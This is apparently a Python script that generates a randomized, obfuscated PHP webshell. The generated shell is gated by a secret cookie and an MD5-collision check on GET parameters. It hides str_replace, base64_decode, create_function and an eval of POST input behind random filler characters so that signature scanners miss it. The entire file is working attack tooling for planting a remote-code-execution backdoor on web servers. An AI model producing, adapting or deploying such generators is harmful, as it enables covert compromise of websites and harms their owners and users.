"""  
@Time: 2024/3/6 16:04 
@Auth: Y5neKO
@File: general.py 
@IDE: PyCharm 
"""
import base64
import random
import string


def gen_webshell(cookie_name, cookie_value, variables):
    webshell = '<?php' + f' if ($_COOKIE[\'{cookie_name}\'] == "{cookie_value}") ' + '{' + f"""
    ${variables[0]} = 'str_r';
    ${variables[1]} = ${variables[0]}.'eplace';
    ${variables[2]} = substr(${variables[1]}, 7);
    ${variables[3]} = 's{variables[4]}t{variables[4]}r{variables[4]}_{variables[4]}r{variables[4]}e{variables[4]}p';
    if ($_GET['{variables[5]}'] !== $_GET['{variables[6]}'] && @md5($_GET['{variables[5]}']) === @md5($_GET['{variables[6]}']))""" + "{" + f"""
    ${variables[7]} = 'str_rep';
    ${variables[3]} = substr_replace('{variables[4]}',${variables[7]},${variables[3]});
    """ + "}" + "else{die();}" + f"""
    ${variables[2]}=${variables[3]}.${variables[2]};
    ${variables[8]}=${variables[2]}("{variables[9][1]}", "", "{variables[9][0]}");
    ${variables[10]}=${variables[8]}("{variables[11][1]}", "", "{variables[11][0]}");
    ${variables[12]}=${variables[10]}("{variables[13][1]}", "", "{variables[13][0]}");
    ${variables[14]}=${variables[12]}(${variables[10]}("{variables[15][1]}", "", "{variables[15][0]}"));
    """ + "} " + "?>"
    return webshell


def generate_random_string(length):
    non_numeric_characters = string.ascii_letters
    numeric_and_non_numeric_characters = string.ascii_letters + string.digits
    random_string = random.choice(non_numeric_characters)
    random_string += ''.join(random.choices(numeric_and_non_numeric_characters, k=length - 1))
    return random_string


def character_encode(str_string, lengths, longchar_characters=""):
    encoding_string = ""
    if longchar_characters == "":
        longchar_characters = "".join(random.sample(string.ascii_letters + string.digits, lengths))  # 生成随机字符
    while True:
        rand_len = int(random.randint(1, 4))  # 返回1到4之间的整数
        if len(str_string) <= rand_len:
            encoding_string += str_string + longchar_characters
            break
        encoding_string += str_string[:rand_len] + longchar_characters
        str_string = str_string[rand_len:]
    return encoding_string, longchar_characters


variables = []
for i in range(1, 20):
    if i == 10:
        variables.append(character_encode("str_replace", 50))
    elif i == 12:
        variables.append(character_encode("base64_decode", 50))
    elif i == 14:
        variables.append(character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50))
    elif i == 16:
        variables.append(character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50))
    else:
        variable = generate_random_string(10)
        variables.append(variable)

print(gen_webshell(generate_random_string(10), generate_random_string(10), variables))
